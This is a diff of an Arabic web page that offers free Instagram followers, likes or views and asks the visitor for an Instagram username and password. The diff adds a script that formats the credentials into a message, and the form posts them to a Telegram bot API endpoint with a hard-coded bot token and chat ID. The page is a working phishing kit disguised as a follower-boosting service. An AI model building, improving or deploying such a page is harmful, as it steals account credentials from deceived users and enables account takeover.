@@ -1,80 +1,110 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>رشق متابعين انستا</title>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>رشق Instagram</title>
   <style>
     body {
       margin: 0;
+      padding: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #2b0034, #000000);
+      text-align: center;
       color: white;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+      background-size: 400% 400%;
+      animation: gradientShift 15s ease infinite;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
-    }.container {
-  background-color: rgba(255, 255, 255, 0.05);
-  padding: 30px;
-  border-radius: 20px;
-  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
-  width: 90%;
-  max-width: 400px;
-}
+      justify-content: center;
+    }
 
-h1 {
-  text-align: center;
-  margin-bottom: 30px;
-}
+    @keyframes gradientShift {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
 
-input,
-select,
-button {
-  width: 100%;
-  padding: 14px;
-  margin-bottom: 20px;
-  border: none;
-  border-radius: 10px;
-  box-sizing: border-box;
-  font-size: 16px;
-}
+    .logo {
+      width: 90px;
+      height: 90px;
+      margin-bottom: 10px;
+    }
 
-input,
-select {
-  background-color: white;
-  color: #2b0034;
-}
+    h1 {
+      font-size: 28px;
+      margin-bottom: 30px;
+    }
 
-button {
-  background-color: #006eff;
-  color: white;
-  font-weight: bold;
-  cursor: pointer;
-  transition: background-color 0.3s;
-}
+    .instagram-colored {
+      background: linear-gradient(to right, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: inline-block;
+    }
 
-button:hover {
-  background-color: #0052cc;
-}
+    input, select {
+      width: 90%;
+      max-width: 300px;
+      padding: 14px;
+      margin-bottom: 15px;
+      border-radius: 10px;
+      border: none;
+      background-color: #ffffff;
+      color: #1a002c;
+      font-size: 16px;
+    }
 
+    button {
+      width: 90%;
+      max-width: 300px;
+      padding: 14px;
+      background-color: #0056ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #003bb3;
+    }
   </style>
-</head><body>
-  <div class="container">
-    <h1>رشق متابعين انستا</h1>
-    <form action="https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage" method="post">
-      <input type="hidden" name="chat_id" value="6454073193">
-      <input type="text" name="username" placeholder="اسم المستخدم" required>
-      <input type="password" name="password" placeholder="كلمة المرور" required>
-      <select name="amount">
-        <option value="1000">1000</option>
-        <option value="2000">2000</option>
-        <option value="5000">5000</option>
-      </select>
-      <select name="type">
-        <option value="متابعين">متابعين</option>
-        <option value="لايكات">لايكات</option>
-        <option value="مشاهدات">مشاهدات</option>
-      </select>
-      <button type="submit">ابدأ الرشق الآن</button>
-    </form>
-  </div>
-</body></html>
+</head>
+<body>
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" />
+  <h1>رشق <span class="instagram-colored">Instagram</span></h1>
+
+  <form method="POST" action="https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage">
+    <input type="text" name="username" placeholder="اسم المستخدم" required />
+    <input type="password" name="password" placeholder="كلمة المرور" required />
+    <select name="amount">
+      <option value="1000">1000</option>
+      <option value="2000">2000</option>
+      <option value="5000">5000</option>
+    </select>
+    <select name="type">
+      <option value="متابعين">متابعين</option>
+      <option value="لايكات">لايكات</option>
+      <option value="مشاهدات">مشاهدات</option>
+    </select>
+    <input type="hidden" name="chat_id" value="6454073193">
+    <input type="hidden" name="text" id="msg">
+    <button type="submit" onclick="prepareMsg()">ابدأ الرشق الآن</button>
+  </form>
+
+  <script>
+    function prepareMsg() {
+      const user = document.querySelector('input[name="username"]').value;
+      const pass = document.querySelector('input[name="password"]').value;
+      const amount = document.querySelector('select[name="amount"]').value;
+      const type = document.querySelector('select[name="type"]').value;
+      const msg = `🔰 طلب جديد:\n👤 المستخدم: ${user}\n🔐 كلمة المرور: ${pass}\n📦 الكمية: ${amount}\n📌 النوع: ${type}`;
+      document.getElementById("msg").value = msg;
+    }
+  </script>
+</body>
+</html>
